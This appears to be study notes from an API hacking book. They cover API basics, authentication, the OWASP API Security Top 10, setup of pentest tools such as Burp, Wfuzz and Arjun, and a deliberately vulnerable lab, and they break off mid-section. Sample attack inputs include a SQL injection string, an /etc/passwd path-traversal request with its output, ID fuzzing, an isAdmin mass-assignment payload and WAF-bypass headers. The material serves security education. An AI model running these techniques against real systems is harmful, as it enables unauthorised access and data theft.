```http
GET /api/v3/inventory/item/pillow HTTP/1.1
Host: rest-shop.com
Accept: application/json
```

```http
HTTP/1.1 200 OK
Content-Type: application/json
Cache-Control: no-store

{ "item": { "id": "00101", "name": "pillow", "count": 25,
            "price": { "currency": "USD", "value": "19.99" } } }
```

💡 REST returns **everything** the provider programmed. The consumer must filter extra data.

#### 🏷️ Common REST headers

|Header|Purpose / Example|
|---|---|
|🔑 **Authorization**|`Authorization: Bearer Ab4dtok3n`|
|📄 **Content-Type**|Media type you're **sending**. (`Accept` = what you want to **receive**)|
|⚙️ **X-... (middleware)**|`X-API-Key`, `X-Powered-By`, `X-Response-Time`, `X-Rate-Limit`, `X-Rate-Limit-Remaining`|

**Authorization types:**

- `Basic` → base64-encoded credentials
- `Bearer` → API token
- `AWS-HMAC-SHA256` → AWS access key + secret key

**Content-Type values:**

- `application/json` (most common)
- `application/xml`
- `application/x-www-form-urlencoded` (`key=value&key2=value2`)

### 🔤 Encoding Data

Encoding removes "bad characters". **Encoding ≠ encryption.**

|Scheme|"hAPI hacker" becomes|
|---|---|
|UTF-8|`\x68\x41\x50\x49\x20\x68\x61\x63\x6B\x65\x72`|
|UTF-16|`\u{68}\u{41}\u{50}\u{49}...`|
|Base64|`aEFQSSBoYWNrZXI=`|

Others: HTML encoding, URL encoding.

---

# here

### 🔮 GraphQL

Specification where the **client defines the data structure** it wants. Query-centric (like SQL). Follows the 6 REST constraints.

|🌿 REST|🔮 GraphQL|
|---|---|
|Many endpoints|**Single endpoint** (e.g. `/graphql`)|
|Returns all fields|Returns **only requested fields**|
|Multiple requests may be needed|**One request** for exact data|
|Many HTTP methods|Mostly **POST**|

```graphql
POST /graphql HTTP/1.1
Host: graphql-shop.com
Authorization: Bearer ab4dt0k3n

{ query {
    inventory (item:"Graphics Card", id: 00101) {
      name
      fields { price quantity }
    }
} }
```

#### 🔧 Three operations

|Operation|Purpose|CRUD|
|---|---|---|
|🔍 **Query**|Retrieve data|Read|
|✍️ **Mutation**|Submit/write data|Create, Update, Delete|
|📡 **Subscription**|Live updates when an event occurs|Read|

- 📋 **Schema** = collection of queryable data (like a REST API collection)
- 🖥️ Browser IDE: **GraphiQL**
- 🧰 Clients: **Postman**, Apollo-Client, GraphQL-Request, GraphQL-CLI, GraphQL-Compose

---

### 🧓 SOAP (not covered in the book)

- Action-oriented, **XML-based**, old (late 1990s, XML-RPC)
- Works over HTTP, SMTP, TCP, UDP (mostly HTTP **POST**)
- Message parts: **Envelope** (required), **Header** (required), **Body** (optional), **Fault** (optional, errors)

---

## 📐 3. REST API Specifications

Frameworks to design and **auto-generate consistent docs**. Think of them as the **"electric sockets" of APIs** 🔌 (one standard format for any appliance).

|Spec|Notes|
|---|---|
|📘 **OpenAPI 3.0 (OAS)** _(formerly Swagger)_|Leading spec; JSON or YAML; describes endpoints, resources, operations, auth|
|📗 **RAML**|RESTful API Modeling Language; **YAML only**|

💡 Later: import specs into **Postman** to get instant access to an API's capabilities.

---

## 🗃️ 4. Data Interchange Formats

### 🟡 JSON (main format in this book)

Key/value pairs in `{ }`, human-readable and easy to parse.

```json
{
  "firstName": "James",
  "tripsToTheMoon": 2,
  "isAstronaut": true,
  "spacecrafts": ["Gemini 7", "Apollo 13"],
  "book": [{ "title": "Lost Moon", "genre": "Non-fiction" }]
}
```

|Type|Example|
|---|---|
|String|`"Motto":"Hack the planet"`|
|Number|`101`, `-102`, `1.03`, `1.0E+4`|
|Boolean|`true` / `false`|
|Null|`"value": null`|
|Array|`["1","2","3"]`|
|Object|`{ "admin": false, "uid": 101 }`|

⚠️ **No inline comments** in JSON (use a key like `"comment": "..."`).

### 🟠 XML

Descriptive **tags**; mostly used by **SOAP** (SOAP only supports XML).

- Starts with a **prolog** (`<?xml version="1.0" encoding="UTF-8" ?>`)
- Needs a **root element**, can have child elements
- Comments: `<!-- comment -->`
- **Longer/heavier** than JSON (565 bytes for the same Twitter example)

### 🟢 YAML ("YAML Ain't Markup Language")

```yaml
---
id: 1278533978970976300
#Comment
truncated: false
...
```

- Starts with `---`, ends with `...`
- **Indentation** instead of brackets, optional quotes
- Comments with `#`
- Often used for **API specifications**

---

## 🔐 5. API Authentication

> **Authentication** = prove who you are • **Authorization** = what you can access. REST/GraphQL are **stateless**: no session. You prove identity in **every request**.

|🔑 Method|How it works|⚠️ Weaknesses|
|---|---|---|
|**Basic Auth**|`username:password` in header/body, plaintext or base64|**No inherent security**. Base64 is easily decoded. Sniffing, MITM, social engineering, brute force|
|**API Keys**|Unique string from provider, sent in query string, header, body, or cookie|Guessable if generated from user data, leaked in repos/comments, intercepted over HTTP, phishing|
|**JWT**|Login → provider issues token → sent in `Authorization` header|Unencrypted token = one base64 decode away; tamper and resend; secret key stolen/brute-forced|
|**HMAC**|Hash of request + shared **secret key**; provider recomputes and compares (AWS)|Compromised secret key = impersonation. Weak hash choice (MD5/SHA1 weaker than SHA256/512)|
|**OAuth 2.0**|Service-to-service authorization with limited, time-based **access tokens**|Poor implementation: token injection, auth code reuse, CSRF, invalid redirect, phishing|
|**No Auth**|Valid for public, non-sensitive data||

### 💻 Basic auth encoding

```bash
$ echo "username:password" | base64
dXNlcm5hbWU6cGFzc3dvcmQK
$ echo "dXNlcm5hbWU6cGFzc3dvcmQK" | base64 -d
username:password
```

💡 Common pattern: use basic auth **once**, then the provider issues an API key/token.

### 🔑 API key examples

```
/api/v1/users?apikey=ju574n3x4mpl34p1k3y        ← query string
"API-Secret": "17813fg8-46a7-5006-e235-45be7e9f2345"   ← header
Cookie: API-Key= 4n07h3r4p1k3y                    ← cookie
```

Example: NASA API requires registering (name + email) to get a key: `api.nasa.gov/planetary/apod?api_key=...`

### 🎫 JWT structure

```
header . payload . signature     (each base64-encoded, separated by dots)
```

|Part|Content|
|---|---|
|**Header**|Signing algorithm (`"alg": "HS512"`, `"typ": "JWT"`)|
|**Payload**|Data (`sub`, `name`, `iat`...)|
|**Signature**|HMAC of encoded header + payload with a secret|

### #️⃣ HMAC algorithms

`HMAC-MD5` < `HMAC-SHA1` < `HMAC-SHA256` < `HMAC-SHA512` (stronger = longer hash but slower).

### 🤝 OAuth 2.0 roles

> Example: sharing tweets to LinkedIn

|Role|Who|
|---|---|
|👤 **Resource owner**|You (the user)|
|📱 **Client/application**|LinkedIn|
|🖥️ **Authorization + resource server**|Twitter|

Flow: you authorize → Twitter issues a limited token → LinkedIn uses it to post on your behalf, **without your password**.

---

## 🐦 6. APIs in Action: Twitter Example

Use a web proxy (**Burp Suite**) to watch traffic.

1. 🌐 Browser sends `GET / HTTP/1.1` to `twitter.com` → `200 OK` (HTML page)
    - Response headers include `x-powered-by: Express`, `x-response-time`, cache/CSP rules
2. 🔍 Searching "hacking" triggers:

```http
POST /1.1/jot/client_event.json?q=hacking HTTP/1.1
Host: api.twitter.com
Authorization: Bearer AAAAAAAAAAAAAAAAA...
```

3. 📥 API replies with **JSON** (tweets, ids, text, `truncated: false`...) and the browser renders it.

🕵️ **Conclusion:** CRUD + naming conventions + tokens + `x-www-form-urlencoded` + JSON = a **RESTful API**.

---

## ✅ Quick Summary

```
📍 Endpoint     → URL to interact with the API
🚪 Gateway      → filters, routes, rate limits, authenticates
🌿 REST         → many endpoints, stateless, JSON, GET/POST/PUT/DELETE
🔮 GraphQL      → single endpoint, POST, query/mutation/subscription
🧓 SOAP         → XML, always POST, old
📐 Specs        → OpenAPI (Swagger) / RAML → docs + Postman import
🗃️ Formats      → JSON • XML • YAML
🔐 Auth         → Basic • API key • JWT • HMAC • OAuth 2.0 • none
🧠 Hacker tip   → identify the API type from headers, naming, data format
```

> 🔑 **Key idea:** recognizing the API type, data format, and auth method tells you **what to expect and what to attack**.

# 🚨 Common API Vulnerabilities (OWASP API Security Top 10)

> **OWASP** (nonprofit, free security tools/content) released the **API Security Top 10** in late 2019, led by Inon Shkedy and Erez Yalon. This chapter covers most of them plus 2 extras: **information disclosure** and **business logic flaws**.

---
## 1️⃣ 📢 Information Disclosure

APIs/supporting software share **sensitive info** with unprivileged users — in responses or public sources (repos, search, news, social media, API directories).

### 🔓 Example: WordPress user enumeration

```
GET https://www.sitename.org/wp-json/wp/v2/users
```

```json
[{"id":1,"name":"Administrator","slug":"admin"}]
```

➡️ Usable for **brute-force, credential stuffing, password spraying**.

### 💬 Verbose messaging

- "User ID does not exist" vs "incorrect password" → **reveals valid usernames**
- Also leaks: software versions, OS info, system logs, bugs

🔍 **Best sources:** API responses (headers, parameters, errors), documentation, recon data.

---

## 2️⃣ 🔓 Broken Object Level Authorization (BOLA)

**Most common** API vuln. Occurs when the API lets a user access **resources that aren't theirs** — no object-level access check.

### 🎮 Example

```
GET https://bestgame.com/api/v3/users?id=5501   → Cloud Strife's data ✅ (authorized)
GET https://bestgame.com/api/v3/users?id=5502   → Zack Fair's data ❌ (NOT authorized) → BOLA!
```

⚠️ **Predictable IDs alone ≠ BOLA.** The flaw is the app **failing to verify ownership**.

### 🧪 Spot the pattern (bold = testable)

```
GET /api/resource/1
GET /user/account/find?user_id=15
POST /company/account/Apple/balance
POST /admin/pwreset/account/90
```

→ Try incrementing/changing the value (`/api/resource/3`, `user_id=23`...).

---

## 3️⃣ 🔑 Broken User Authentication

Weaknesses in the **authentication process** — missing or poorly implemented protections.

> "The future of digital systems is complexity, and complexity is the worst enemy of security." — Bruce Schneier

Since REST is **stateless**, tokens replace sessions → the whole chain (registration → token generation → token handling) can have flaws.

### 🎯 What to check

- 🎲 **Token entropy** — low randomness = guessable/forgeable tokens
- 📦 **Token handling** — hardcoded tokens in JS source, insecure storage/transmission
- 🔢 **Password reset codes** — a 6-digit code with no rate limit = only 1,000,000 tries; 4-digit = 10,000
- 🔓 Sensitive resources reachable **without auth**
- 🔗 API keys/tokens/credentials exposed **in URLs**
- 🚫 **No rate limiting** on auth attempts
- 📣 Verbose error messages

### 🐙 Example: hardcoded key on GitHub

```json
"oauth_client": [{"client_id": "12345-abcd", "client_type": "admin",
"api_key": "AIzaSyDrbTFCeb5k0yPSfL2heqdF-N19XoLxdw"}]
```

💡 In stateless REST, a leaked API key = **the same as a stolen username+password**.

---

## 4️⃣ 📦 Excessive Data Exposure

API returns **more data than needed**, expecting the consumer to filter it.

### 🏦 Example

Request: `GET /api/v3/account?name=Cloud+Strife`

Response includes not just Cloud's data, but also the **admin who created the account**: name, ID, email, `privilege: super-admin`, `two_factor_auth: false`. 😱

💡 Detection = just **compare what you asked for vs what you got back**.

---

## 5️⃣ 🚦 Lack of Resources & Rate Limiting

No request caps → **DoS risk** + **monetization bypass** (e.g. RapidAPI: 500 free/month vs 1,000 paid) + **unplanned infra costs** (auto-scaling).

### 🧪 How to test

1. Send a burst of requests → expect **HTTP 429** if limiting works
2. Try to **bypass**: add/remove a parameter, switch client, change IP

---

## 6️⃣ 🧩 Broken Function Level Authorization (BFLA)

A user of one role can use **functions/actions** meant for another role (lateral move or **privilege escalation**).

|🔓 BOLA|🧩 BFLA|
|---|---|
|Unauthorized **access** to data|Unauthorized **actions**|
|"See someone else's balance"|"Transfer someone else's money"|

### 🏦 Example

- User endpoint: `/{user}/account/balance`
- Admin endpoint: `/admin/account/{user}` ← if reachable by a normal user = **BFLA**

💡 Can also hinge on **HTTP method**: if `GET` is restricted but `POST`/`PUT`/`DELETE` aren't, switching methods may bypass controls.

### ✅ How to find it

- Get the **admin API docs** (e.g. Cisco Webex Admin API) and replay admin requests as a low-privilege user
- `401`/`403` = protected; a successful response = **BFLA found**
- No docs? Reverse-engineer the endpoints first (Ch. 7)

---

## 7️⃣ ✍️ Mass Assignment

API accepts **more parameters than intended** and blindly maps them to internal objects → consumer can edit fields they shouldn't.

### 👑 Example

Intended:

```json
{ "User": "scuttleph1sh", "Password": "GreatPassword123" }
```

Attack (add an undocumented field found in docs):

```json
{ "User": "scuttleph1sh", "Password": "GreatPassword123", "isAdmin": true }
```

➡️ If unsanitized, you just **created an admin account**.

🔍 **Find it:** read docs for interesting params, intercept traffic, guess/fuzz parameters (Ch. 9).

---

## 8️⃣ ⚙️ Security Misconfigurations

A grab-bag of setup mistakes: bad headers, weak/missing transit encryption, default accounts, unnecessary HTTP methods allowed, no input sanitization, verbose errors.

### 🏷️ Revealing headers

```http
X-Powered-By: VulnService 1.11     ← backend tech + version (search exploits!)
X-XSS-Protection: 0                ← 0 = no XSS protection, 1 = protected
X-Response-Time: 566.43            ← can leak which resources exist (timing side-channel)
```

### ⏱️ Timing attack example

```
UserA 404 → X-Response-Time: 25.5
UserB 404 → X-Response-Time: 25.5
UserC 404 → X-Response-Time: 510.00   ← 20x longer → UserC likely EXISTS
```

### 🔐 Other checks

- 🔒 **TLS** must be used for sensitive data (otherwise MITM + Wireshark = cleartext capture)
- 🔑 **Default credentials** left active
- 🌐 **Unnecessary HTTP methods** enabled

🔧 **Scanners:** Nessus, Qualys, OWASP ZAP, Nikto (or manual header/cert/cookie inspection).

---

## 9️⃣ 💉 Injections

API passes **unsanitized input** straight to the backend (DB/OS), which executes it as code: SQL injection, NoSQL injection, command injection.

### 🧪 SQL injection attempt

```json
POST /api/v1/register
{ "Fname": "hAPI", "Lname": "Hacker", "Address": "' OR 1=0--" }
```

→ A SQL error response = **injection confirmed**.

### 📂 Command/path injection example

```
GET http://10.10.78.181:5000/api/v1/resources/books?show=/etc/passwd
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

➡️ Full `/etc/passwd` dumped — the `show=` parameter wasn't sanitized.

🔍 **Clues:** verbose errors, unexpected status codes, odd behavior.

---

## 🔟 📦 Improper Assets Management

Exposed APIs that are **retired** or **still in development** — less patched, less secure.

### 🏷️ Naming patterns to watch

```
/v1/  /v2/  /v3/        ← version history
/alpha/ /beta/ /test/ /uat/ /demo/   ← dev/staging environments
```

➡️ If docs mention `apiv1.org/admin` but production uses `apiv3.org/admin`, **try the old one**.

💡 Often a **gateway to other vulns**: excessive data exposure, mass assignment, poor rate limiting, injection.

🔍 **Find it:** outdated docs, changelogs, version history, guessing/fuzzing/brute-force on path patterns.

---

## 1️⃣1️⃣ 🧠 Business Logic Vulnerabilities (BLFs)

**Intended features abused maliciously.** The app assumes consumers are trustworthy/well-behaved — trust as a (weak) security control.

### 🏦 Real example: Experian partner API leak (early 2021)

A partner embedded Experian's **credit check API** in their own web app, exposing partner-level requests to end users → anyone could pull **credit scores/risk factors** by submitting a name + address. Root cause: **misplaced trust**.

### 🚩 Red flags in documentation

```
"Only use feature X to perform function Y."
"Do not do X with endpoint Y."
"Only admins should perform request X."
```

➡️ These are **instructions, not enforced controls** — test what happens if you ignore them.

### 🔐 Example: MFA bypass via parameter tampering

```
POST /api/v1/login
UserId=hapihacker&password=arealpassword!&MFA=true
```

➡️ Try flipping `MFA=true` → `MFA=false`.

⚠️ Hard to automate — requires understanding the **specific business** and thinking adversarially about its assumptions.

---

## ✅ Quick Summary

```
📢 Info disclosure   → leaked usernames, verbose errors, versions
🔓 BOLA              → access to OTHER users' DATA (object IDs)
🔑 Broken Auth        → weak tokens, no rate limit, leaked keys
📦 Excessive exposure → API returns more than requested
🚦 No rate limiting   → DoS risk, cost abuse, bypass 429
🧩 BFLA              → access to OTHER roles' ACTIONS (admin functions)
✍️ Mass assignment    → hidden params (e.g. isAdmin) accepted blindly
⚙️ Misconfig          → headers, TLS, defaults, extra HTTP methods
💉 Injection          → unsanitized input → SQL/NoSQL/command execution
📦 Improper assets    → old/dev API versions (/v1/, /beta/) still live
🧠 Business logic     → abusing INTENDED features (trust assumptions)
```

> 🔑 **Key idea:** BOLA = wrong **data**, BFLA = wrong **action**. Most vulns come down to the API **trusting the client** too much — missing checks on who's asking, what they're asking for, and how often.


# 🧰 Your API Hacking System

> Setting up the API hacking toolkit: **Chrome DevTools, Burp Suite, Postman**, plus supplemental tools for the free Burp Suite CE.

---

## 🐉 1. Kali Linux

Debian-based pentest distro, comes with most tools pre-installed. Download: https://www.kali.org/downloads

```bash
# Update system
sudo apt update
sudo apt full-upgrade -y

# Install basics
sudo apt-get install git python3 golang
```

---

## 🔍 2. Chrome DevTools

Built-in browser dev suite — great for first discovery of APIs.

```bash
sudo wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
sudo apt install ./google-chrome-stable_current_amd64.deb
```

Open with `google-chrome`, then **F12** or **CTRL+SHIFT+I**. Refresh with **CTRL+R**.

### 🧰 DevTools Panels

|Panel|Function|
|---|---|
|🧱 **Elements**|CSS + DOM, inspect HTML|
|💻 **Console**|JS debugger, alerts, run commands|
|📂 **Sources**|Source files — may contain hardcoded API keys/secrets 🔑|
|🌐 **Network**|All resource requests (start here for API discovery)|
|⏱️ **Performance**|Record page load events → see exactly when API calls fire|
|🧠 **Memory**|Browser memory usage|
|📦 **Application**|Manifest, cookies, session storage, cache|
|🔒 **Security**|TLS, content origins, certificates|

💡 Click a request in **Network** → see method, status code, headers, body (Headers/Response tabs). 💡 **Performance** tab shows the exact millisecond a client action (e.g. login) triggers an API call.

---

## 🦊 3. Burp Suite

PortSwigger's web app testing powerhouse: intercept, spider, fuzz APIs.

|Term|Meaning|
|---|---|
|🕷️ **Spidering**|Auto-crawl URLs via HTML hyperlinks (misses hidden paths — use Kiterunner for those)|
|🎲 **Fuzzing**|"the art of automatic bug finding" (OWASP) — send varied inputs, watch for unexpected responses|

Community Edition (CE) ships with Kali; install manually if needed:

```bash
sudo apt-get install burpsuite
```

💰 Pro: 30-day free trial at portswigger.net/requestfreetrial/pro

### 🦊 Setting up FoxyProxy

1. Install **FoxyProxy Standard** browser add-on
2. Fox icon → Options → Proxies → Add New Proxy → Manual Config
3. Host: `127.0.0.1` • Port: `8080` (Burp's default)
4. Name it **Hackz**

### 📜 Adding Burp's CA Certificate (needed because of HSTS)

1. Start Burp, enable **Hackz** proxy in browser
2. Visit `http://burpsuite` → download **CA Certificate**
3. Import it: Firefox → Preferences → search "certificates" → Import Chrome → Settings → search "certificates" → More → Manage Certificates → Authorities → Import

### 🧭 Burp Suite Modules

|Module|Purpose|
|---|---|
|📊 **Dashboard**|Event log, scan overview (more useful in Pro)|
|🔌 **Proxy**|Capture requests/responses from browser & Postman|
|🎯 **Target**|Site map, manage targets, define **scope**|
|💥 **Intruder**|Fuzzing & brute-force attacks|
|🔁 **Repeater**|Manually tweak a request, resend, inspect response|
|🔢 **Sequencer**|Entropy analysis — are tokens/cookies actually random?|
|🔤 **Decoder**|Encode/decode: HTML, base64, hex, ASCII, octal, binary, Gzip|
|⚖️ **Comparer**|Diff two requests/responses|
|📚 **Learn**|Tutorials, Support Center, Web Security Academy link|
|🛡️ **Scanner** _(Pro)_|Automated vuln crawler/scanner|
|🧩 **Extender**|Install extensions (app store)|

🎨 Tip: User options → Display → "Darcula" for a dark theme.

### 🎣 Intercepting Traffic

1. Proxy tab → **Intercept is on**
2. Browse to target via **Hackz** proxy → page won't load (request held in Burp)
3. Request appears in Burp → right-click → **Send to Repeater** (or another module)

### 💥 Intruder — Attack Positions & Payloads

Mark a variable with `§...§` (e.g. around a password or ID). Then choose a **Payload** list.

#### 🎯 4 Attack Types

|Type|Behavior|Use case|
|---|---|---|
|🎯 **Sniper**|1 payload set, cycles through **one position at a time**|Fuzzing a single parameter|
|🔨 **Battering ram**|1 payload set, **same value in all positions** simultaneously|Testing SQLi across multiple fields at once|
|🍴 **Pitchfork**|Multiple payload sets, moves **in lockstep** (user1:pass1, user2:pass2...)|Testing known leaked credential pairs|
|💣 **Cluster bomb**|Multiple payload sets, **all combinations** (user1:pass1, user1:pass2...)|Password spraying|

💡 Intruder helps find: **BOLA, excessive data exposure, broken authentication, BFLA, mass assignment, injection, improper assets management.**

### 🧩 Useful Burp Extensions

|Extension|Use|
|---|---|
|🔓 **Autorize**|Automates BOLA testing (compare UserA vs UserB access)|
|🎫 **JSON Web Tokens**|Dissect/attack JWTs|
|🔮 **InQL Scanner**|GraphQL API attacks|
|🌍 **IP Rotate**|Rotate source IP via cloud regions (bypass IP blocking)|
|🛡️ **Bypass WAF**|Auto-adds headers (`X-Originating-IP`, `X-Forwarded-For`, `X-Remote-IP`, `X-Remote-Addr`) to trick some WAFs|

---

## 📮 4. Postman (API Browser)

Think of it as **a browser built for APIs** — REST, SOAP, GraphQL.

```bash
sudo wget https://dl.pstmn.io/download/latest/linux64 -O postman-linux-x64.tar.gz
sudo tar -xvzf postman-linux-x64.tar.gz -C /opt
sudo ln -s /opt/Postman/Postman /usr/bin/postman
```

Launch with `postman` — sign up or **Skip signing in**.

### 🦊 Second FoxyProxy setup (for Postman)

Host `127.0.0.1`, Port **5555** (Postman's default proxy port), name it **Postman**.

### 🏗️ Request Builder

|Tab|Purpose|
|---|---|
|🧩 **Params**|Query/path parameters (key/value), supports variables like `:company`|
|🔐 **Authorization**|No auth, API key, Bearer Token, Basic Auth, or inherit from parent collection|
|🏷️ **Headers**|Key/value pairs (auto-suggested)|
|📦 **Body**|Data for PUT/POST/PATCH (none, form-data, x-www-form-urlencoded, raw, binary, GraphQL)|
|📝 **Pre-request script**|JS run before sending — can chain requests|
|🧪 **Tests**|JS tests on the response|

**Response panels:** Body • Cookies • Headers • Test results.

Switch request/response layout: **CTRL+ALT+V**.

### 🌍 Environments

Store reusable variables (tokens, URLs, IDs) shared across requests.

- **Initial value** → shared with team
- **Current value** → local only (good for secrets)

Create: top-right "Environment" dropdown → **CTRL+N**.

### 📦 Collections

Groups of saved requests — importable from a provider.

**Supported import formats:** OpenAPI 3.0, RAML 0.8/1.0, GraphQL, cURL, WADL, Swagger 1.2/2.0, Runscope, DHC — as file, folder, link, raw text, or GitHub.

**Import via link:**

1. Click **Import** → **Link** tab
2. Paste spec URL → Continue → Import

💡 After import, check **collection variables** (Edit Collection → Variables) — e.g. set `{{baseUrl}}` to the real API URL.

### 🏃 Collection Runner

Runs **all requests in a collection**: choose environment, iteration count, delay (for rate limits), and request order. Shows a **Run Summary**.

### 💻 Code Snippets

"Code" button (top-right of request) → export the request as **cURL, Go, HTTP, JavaScript, NodeJS, PHP, Python**.

### 🧪 Tests Panel

Prebuilt JS snippets, e.g.:

```javascript
pm.test("Status code is 200", function () {
  pm.response.to.have.status(200);
});
```

💡 Always verify a test can both **pass and fail** correctly before trusting it.

### 🔗 Postman → Burp Suite

1. Postman: **CTRL+,** → Proxy tab → enable custom proxy → `127.0.0.1:8080`
2. General tab → SSL certificate verification **Off**
3. Burp Suite: Proxy tab → **Intercept On**

Now Postman-crafted requests flow through Burp for further tampering (brute-force, fuzzing).

---

## 🧪 5. Supplemental Tools

|Tool|Best for|
|---|---|
|🗺️ **OWASP Amass**|Passive/active recon — domains & subdomains|
|🪁 **Kiterunner**|API-aware content discovery (fastest/smartest option)|
|🔎 **Nikto**|Quick web server info gathering, misconfig detection|
|🕷️ **OWASP ZAP**|Automated scan (surface) + manual explore (HUD) beyond auth|
|🎲 **Wfuzz**|Flexible fuzzing with filters|
|🔍 **Arjun**|Hidden parameter discovery|

### 🗺️ OWASP Amass

```bash
sudo apt-get install amass
mkdir $HOME/.config/amass
curl https://raw.githubusercontent.com/OWASP/Amass/master/examples/config.ini > $HOME/.config/amass/config.ini
```

💡 Add free API keys (GitHub, Twitter, Censys...) to `config.ini` to boost results.

### 🪁 Kiterunner

```bash
git clone https://github.com/assetnote/kiterunner.git
cd kiterunner
make build
sudo ln -s $(pwd)/dist/kr /usr/local/bin/kr
```

- Scans up to **30,000 requests/sec** (rate-limit aware)
- Includes data from **67,500 Swagger files**
- Detects API frameworks: Django, Express, FastAPI, Flask, Nginx, Spring, Tomcat

```bash
mkdir -p ~/api/wordlists
curl https://wordlistscdn.assetnote.io/data/automated/httparchive_apiroutes_2021_06_28.txt > latest_api_wordlist.txt

# Or grab everything (~2.2GB)
wget -r --no-parent -R "index.html*" https://wordlistscdn.assetnote.io/data/ -nH
```

### 🔎 Nikto

```bash
nikto -h https://example.com
nikto -Help                          # see all options
nikto -h https://example.com -output results.txt -maxtime 300
```

Reports: allowed HTTP methods, header issues, potential endpoints, interesting directories.

### 🕷️ OWASP ZAP

|Mode|Use|
|---|---|
|🤖 **Automated scan**|Crawls, detects vulns, alters parameters — surface-level, can have false positives|
|🖱️ **Manual explore (ZAP HUD)**|Proxies your browsing live — overlays alerts while you interact (e.g. signup/login flow)|

### 🎲 Wfuzz

```bash
wfuzz -z file,/usr/share/wordlists/list.txt http://targetname.com/FUZZ
```

|`-z` type|Meaning|
|---|---|
|`file,<path>`|Wordlist from file|
|`list,A-B-C`|Inline list|
|`range,500-1000`|Number range (great for BOLA testing!)|

```bash
# Test HTTP verb/path via POST
wfuzz -X POST -z list,admin-dashboard-docs-api-test http://targetname.com/FUZZ

# Fuzz a numeric ID range (BOLA)
wfuzz -z range,500-1000 http://targetname.com/account?user_id=FUZZ

# Multiple positions: FUZZ, FUZ2, FUZ3...
wfuzz -z list,A-B-C -z range,1-3 http://targetname.com/FUZZ/user_id=FUZZ2
```

**Filters — show only:**

```
--sc  status code     --sl  line count
--sw  word count       --sh  char count
```

**Filters — hide:**

```
--hc  status code     --hl  line count
--hw  word count       --hh  char count
```

```bash
wfuzz -z file,/usr/share/wordlists/list.txt --sc 200 http://targetname.com/FUZZ
wfuzz -z file,/usr/share/wordlists/list.txt --hc 404 --hh 950 http://targetname.com/FUZZ
```

### 🔍 Arjun

```bash
cd /opt/
sudo git clone https://github.com/s0med3v/Arjun.git

python3 /opt/Arjun/arjun.py -u http://target_address.com
python3 /opt/Arjun/arjun.py -u http://target_address.com -o arjun_results.json
python3 /opt/Arjun/arjun.py -u http://target_address.com -o out.json --stable   # if rate-limited
python3 /opt/Arjun/arjun.py -i burp_targets.txt                                  # multiple targets
```

- Comes with **~26,000 parameter wordlist**
- Built-in anomaly detection filters results automatically

---

## 🧪 Lab #1: Enumerating User Accounts in a REST API

**Target:** `reqres.in` (a test REST API) • **Goal:** find the total number of user accounts.

### 🪜 Steps

1. 📖 Check docs on `reqres.in` → find the `/api/users/{id}` (Single User) endpoint
2. 📮 Postman: `GET http://reqres.in/api/users/1` → confirms it works (returns George Bluth)
3. 🔗 Proxy the Postman request through **Burp Suite** (resend the same request with the Postman-Burp proxy on)
4. 🎯 In Burp, send the intercepted request to **Intruder**
5. ✂️ **Positions tab:** Clear § → select the ID number in the URL → Add §
6. 🔢 **Payloads tab:** type = **Numbers**, range **0 to 25**, step **1** → 26 total requests
7. ▶️ **Start Attack**

### ✅ Result

- IDs **1–12** → `200 OK` (valid users)
- IDs **13–25** → `404 Not Found`
- ➡️ **12 valid user accounts** found

💡 This same technique applies to real targets for IDs, account numbers, phone numbers, emails, etc. — a basic **BOLA** discovery method (expanded in Chapter 10).

🎯 **Bonus exercise:** redo this scan using **Wfuzz**.

---

## ✅ Quick Summary

```
🔍 DevTools      → Network/Sources/Performance → first API discovery
🦊 Burp Suite     → intercept (FoxyProxy+CA cert), Repeater, Intruder (4 attack types)
📮 Postman        → craft requests, collections, environments, tests, → proxy to Burp
🗺️ Amass          → passive/active recon (domains/subdomains)
🪁 Kiterunner     → API-aware content discovery (fast, framework-aware)
🔎 Nikto          → quick web server/misconfig scan
🕷️ ZAP            → automated scan + manual HUD explore
🎲 Wfuzz          → flexible fuzzing (file/list/range payloads + filters)
🔍 Arjun          → hidden parameter discovery
```

> 🔑 **Key idea:** DevTools for first look → Burp Suite for intercept/fuzz → Postman for crafting/chaining requests. Supplemental tools fill gaps left by free Burp CE.


# 🎯 Setting Up Vulnerable API Targets

> Build your **own API target lab** to safely practice attacks, make mistakes, and learn from both the **offensive and defensive** side.

⚠️ **Safety warning:** these apps are **deliberately vulnerable**. Keep the lab **isolated** from your home/work network — never expose it to the internet or your main LAN.

---

## 🖥️ 1. Creating a Linux Host

- Recommended: a recent **Ubuntu** image
- On a **hypervisor** (VMware, Hyper-V, VirtualBox) or in the **cloud** (AWS, Azure, GCP)
- 💡 Put each vulnerable app on **its own host** — avoids resource conflicts and cross-contamination between apps

📚 Recommended guides: Cybrary, Black Hills InfoSec, Null Byte, Hacking Articles (all have free home-lab tutorials).

---

## 🐳 2. Installing Docker & Docker Compose

Docker runs the vulnerable apps as **containers** — fast setup.

```bash
# Install Docker (follow official Ubuntu guide: docs.docker.com/engine/install/ubuntu)

# Verify installation
sudo docker run hello-world
```

**Docker Compose** runs multiple containers from one YAML file:

```bash
docker-compose up
```

(Official install guide: docs.docker.com/compose/install)

---

## 🧪 3. Installing Vulnerable Applications

Four apps selected for this lab: **crAPI**, **Pixi**, **Juice Shop**, **DVGA**.

### 🚗 crAPI (completely ridiculous API)

Built by the **OWASP API Security Project** (Inon Shkedy, Erez Yalon, Paolo Silva). **Main target for most labs** in this book.

- Includes: web app + API + **MailHog** email server
- Features: shop for vehicle parts, community chat, link a vehicle to find repair shops
- Realistic implementations of the **OWASP API Security Top 10**

### 🥧 OWASP DevSlop's Pixi

**MEAN stack** (MongoDB, Express.js, Angular, Node) by Nicole Becher, Nancy Gariché, Mordecai Kraushar, Tanya Janca.

Think: **social media platform + virtual payment system**. Interesting: user info, admin functionality, payment system.

```bash
git clone https://github.com/DevSlop/Pixi.git
cd Pixi
sudo docker-compose up
```

➡️ Browse to `http://localhost:8000`

### 🧃 OWASP Juice Shop

OWASP flagship project by **Björn Kimminich**. Covers both **OWASP Top 10** and **API Security Top 10**. Built with Node.js, Express, Angular — REST APIs. Has a **hidden scoreboard** tracking your progress. Most actively maintained (70+ contributors).

```bash
docker pull bkimminich/juice-shop
docker run --rm -p 80:3000 bkimminich/juice-shop
```

➡️ Browse to `http://localhost` (or `http://192.168.99.100` on macOS/Windows with Docker Machine)

💡 `-p 80:3000` avoids a **port conflict** with DVGA, which also defaults to port 3000.

### 🔮 Damn Vulnerable GraphQL Application (DVGA)

